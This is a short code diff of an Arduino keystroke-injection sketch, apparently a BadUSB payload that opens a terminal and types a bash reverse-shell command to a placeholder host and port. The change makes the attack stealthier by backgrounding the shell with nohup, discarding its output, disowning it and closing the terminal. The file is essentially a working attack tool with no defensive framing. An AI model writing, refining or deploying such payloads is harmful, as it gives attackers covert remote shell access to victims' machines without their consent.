@@ -12,16 +12,10 @@ void setup()
   pressKey(KEY_LEFT_GUI);
 
   delay(750); 
-  Keyboard.print("terminal");
-
-  delay(750);
-  pressKey(KEY_RETURN);
+  Keyboard.println("terminal");
 
   delay(1500);
-  Keyboard.print("/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'");
-
-  delay(75);
-  pressKey(KEY_RETURN);
+  Keyboard.println("nohup /bin/bash -c \"/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\" >/dev/null 2>&1 &; disown; exit");
 }
  
 
